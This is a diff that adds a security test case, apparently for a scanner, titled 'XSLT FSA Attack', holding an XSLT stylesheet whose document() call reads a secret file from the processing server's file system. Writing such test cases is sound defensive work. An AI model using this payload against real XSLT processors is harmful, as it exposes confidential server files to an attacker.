@@ -1,0 +1,14 @@
+<!--;testcase
+[General]
+name: XSLT FSA Attack
+description: File System Access via XML Stylesheet Language Transformation (XSLT)
+filename: xslt.xsl
+
+[File secret_xml]
+path: secret.xml
+-->
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+      <xsl:value-of select="document('{files.secret_xml}')" />
+  </xsl:template>
+</xsl:stylesheet>
